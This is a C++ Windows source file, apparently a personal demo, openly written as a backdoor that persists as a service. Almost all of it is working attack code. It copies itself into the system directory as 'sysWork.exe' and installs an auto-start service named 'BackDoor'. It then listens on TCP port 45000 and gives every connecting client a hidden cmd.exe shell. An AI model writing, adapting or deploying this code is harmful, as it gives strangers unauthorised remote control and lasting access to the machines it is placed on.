//////////////////////////////////////////////////////////////
//
// FileName : ServiceAutoRunDemo.cpp
// Creator : PeterZ1997
// Date : 2018-5-4 23:19
// Comment : Create Service to make the BackDoor Run Automatically
//
//////////////////////////////////////////////////////////////

#include"Service.h"

using namespace std;

#define SERVICE_OP_ERROR -1
#define SERVICE_ALREADY_RUN -2

const unsigned int MAX_COUNT = 255; /// String Max Length
const DWORD PORT = 45000;           /// Listen Port
const unsigned int LINK_COUNT = 30; /// Max Link Number

SERVICE_STATUS g_ServiceStatus;
SERVICE_STATUS_HANDLE g_hServiceStatus;

/**
* @brief CallBack Function to Translate Service Control Code
* @param dwCode Service Control Code
*/
void WINAPI ServiceControl(DWORD dwCode)
{
	switch (dwCode)
	{
		//服务暂停
	case SERVICE_CONTROL_PAUSE:
		g_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
		//服务继续
	case SERVICE_CONTROL_CONTINUE:
		g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
		//服务停止
	case SERVICE_CONTROL_STOP:
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 0;
		g_ServiceStatus.dwWaitHint = 0;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
	//设置服务状态
	if (SetServiceStatus(g_hServiceStatus, &g_ServiceStatus) == 0)
	{
		printf("Set Service Status Error\n");
	}
}

/**
* @brief Start Remote Shell
* @lpParam the Client Handle
*/
DWORD WINAPI StartShell(LPVOID lpParam)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WCHAR cmdline[MAX_COUNT] = { 0 };
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)lpParam;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	GetSystemDirectory(cmdline, sizeof(cmdline));
	lstrcat(cmdline,L"\\cmd.exe");
	while (!CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		Sleep(100);
	}
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}
#include <Windows.h>

#include <UserEnv.h>
#include <WtsApi32.h>
#pragma comment(lib, "UserEnv.lib")
#pragma comment(lib, "WtsApi32.lib")

/**
* @brief Service Running Function
* @lpParam NULL
*/
DWORD WINAPI RunService(LPVOID lpParam)
{
	CHAR wMessage[MAX_COUNT] = "<================= Welcome to Back Door >_< ==================>\n";
	SOCKET sClient[30];
	DWORD dwThreadId[30];
	HANDLE hThread[30];
	WSADATA wsd;
	if (WSAStartup(0x0202, &wsd))
	{
		printf("WSAStartup Process Error\n");
		return 0;
	}
	SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(PORT);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	if (bind(sListen, (LPSOCKADDR)&sin, sizeof(sin))) return 0;
	if (listen(sListen, LINK_COUNT)) return 0;
	for (int i = 0; i < LINK_COUNT; i++)
	{
		sClient[i] = accept(sListen, NULL, NULL);
		hThread[i] = CreateThread(NULL, 0, StartShell, (LPVOID)sClient[i], 0, &dwThreadId[i]);
		send(sClient[i], wMessage, strlen(wMessage), 0);
	}
	WaitForMultipleObjects(LINK_COUNT, hThread, TRUE, INFINITE);
	return 0;
}

/**
* @brief the Main Function of the Service
*/
void WINAPI ServiceMain2(DWORD dwArgc, LPTSTR *lpArgv)
{
	HANDLE hThread;
	g_ServiceStatus.dwCheckPoint = 0;
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_STOP;
	g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	g_ServiceStatus.dwServiceSpecificExitCode = 0;
	g_ServiceStatus.dwServiceType = SERVICE_WIN32;
	g_ServiceStatus.dwWaitHint = 0;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_hServiceStatus = RegisterServiceCtrlHandler(L"BackDoor", ServiceControl);
	if (!g_hServiceStatus)
	{
		printf("Register Service Error\n");
		return;
	}
	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwCheckPoint = 0;
	g_ServiceStatus.dwWaitHint = 0;
	if (!SetServiceStatus(g_hServiceStatus, &g_ServiceStatus))
	{
		printf("Set ServiceStatus Error !\n");
		return;
	}
	hThread = CreateThread(NULL, 0, RunService, NULL, 0, NULL);
	if (!hThread)
	{
		printf("Create Thread Error\n");
	}
	DoTask();
}

/**
* @brief Install Service
*/
int APIENTRY InstallService()
{
	DWORD dwErrorCode;
	SC_HANDLE hscManager;
	SC_HANDLE hServiceHandle;
	SERVICE_STATUS ssServiceStatus;
	WCHAR szSystemPath[MAX_COUNT] = L"\0";
	WCHAR szFileSelfPath[MAX_COUNT] = L"\0";
	GetSystemDirectory(szSystemPath, sizeof(szSystemPath));
	GetModuleFileName(NULL, szFileSelfPath, sizeof(szFileSelfPath));
	lstrcat(szSystemPath, L"\\sysWork.exe");
	CopyFile(szFileSelfPath, szSystemPath, true);
	hscManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hscManager)
	{
		printf("Can not Open the Service Manager\n");
		return SERVICE_OP_ERROR;
	}
	printf("Service Manager Opened Success\n");
	hServiceHandle = CreateService(hscManager, L"BackDoor", L"BackDoor", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, szSystemPath, NULL, NULL, NULL, NULL, NULL);
	if (!hServiceHandle)
	{
		dwErrorCode = GetLastError();
		if (dwErrorCode == ERROR_SERVICE_EXISTS)
		{
			hServiceHandle = OpenService(hscManager, L"BackDoor", SERVICE_ALL_ACCESS);
			if (!hServiceHandle)
			{
				printf("Can not Create/Open Service\n");
				CloseServiceHandle(hServiceHandle);
				return SERVICE_OP_ERROR;
			}
			else
			{
				printf("Service Opened Success\n");
			}
		}
	}
	else {
		printf("Service Create Success\n");
	}
	if (!StartService(hServiceHandle, 0, NULL))
	{
		dwErrorCode = GetLastError();
		if (dwErrorCode == ERROR_SERVICE_ALREADY_RUNNING)
		{
			printf("SERVEICE IS ALREADY RUNNING\n");
			CloseServiceHandle(hServiceHandle);
			CloseServiceHandle(hscManager);
			return SERVICE_ALREADY_RUN;
		}
		else
		{
			printf("SERVEICE START ERROR\n");
			CloseServiceHandle(hServiceHandle);
			CloseServiceHandle(hscManager);
			return SERVICE_OP_ERROR;
		}
	}
	while (QueryServiceStatus(hServiceHandle, &ssServiceStatus))
	{
		if (ssServiceStatus.dwCurrentState == SERVICE_START_PENDING)
		{
			Sleep(100);
			continue;
		}
		if (ssServiceStatus.dwCurrentState != SERVICE_RUNNING)
		{
			printf("Service Start Process ERROR\n");
			CloseServiceHandle(hServiceHandle);
			CloseServiceHandle(hscManager);
			return SERVICE_OP_ERROR;
		}
		else
		{
			break;
		}
	}
	if (!QueryServiceStatus(hServiceHandle, &ssServiceStatus))
	{
		printf("Service Status Get Error\n");
		CloseServiceHandle(hServiceHandle);
		CloseServiceHandle(hscManager);
		return SERVICE_OP_ERROR;
	}
	printf("Service Start Success\n");
	CloseServiceHandle(hServiceHandle);
	CloseServiceHandle(hscManager);
	return 0;
}


/**
* @brief Remove Service
*/
int RemoveService()
{
	SC_HANDLE hscManager;
	SC_HANDLE hServiceHandle;
	SERVICE_STATUS ssServiceStatus;
	hscManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hscManager)
	{
		printf("Open Service Manager Error\n");
		return SERVICE_OP_ERROR;
	}
	printf("Open Service Manager Success\n");
	hServiceHandle = OpenService(hscManager, L"BackDoor", SERVICE_ALL_ACCESS);
	if (!hServiceHandle)
	{
		printf("Open Service Error\n");
		return SERVICE_OP_ERROR;
	}
	printf("Open Service Success\n");
	if (QueryServiceStatus(hServiceHandle, &ssServiceStatus))
	{
		if (ssServiceStatus.dwCurrentState == SERVICE_RUNNING)
		{
			ControlService(hServiceHandle, SERVICE_CONTROL_STOP, &ssServiceStatus);
		}
	}
	else
	{
		printf("Service Status Get Error\n");
		CloseServiceHandle(hServiceHandle);
		CloseServiceHandle(hscManager);
		return SERVICE_OP_ERROR;
	}
	if (!DeleteService(hServiceHandle))
	{
		printf("Delete Service Error\n");
		CloseServiceHandle(hServiceHandle);
		CloseServiceHandle(hscManager);
		return SERVICE_OP_ERROR;
	}
	printf("Remove Service Success\n");
	CloseServiceHandle(hServiceHandle);
	CloseServiceHandle(hscManager);
	return 0;
}

void ShowMessage(WCHAR *lpszMessage, WCHAR *lpszTitle)
{
	// 获取当前的Session ID
	DWORD dwSessionId = WTSGetActiveConsoleSessionId();
	// 显示消息对话框
	DWORD dwResponse = 0;
	WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, dwSessionId,
		lpszTitle, (1 + ::lstrlen(lpszTitle)),
		lpszMessage, (1 + ::lstrlen(lpszMessage)),
		0, 0, &dwResponse, FALSE);
}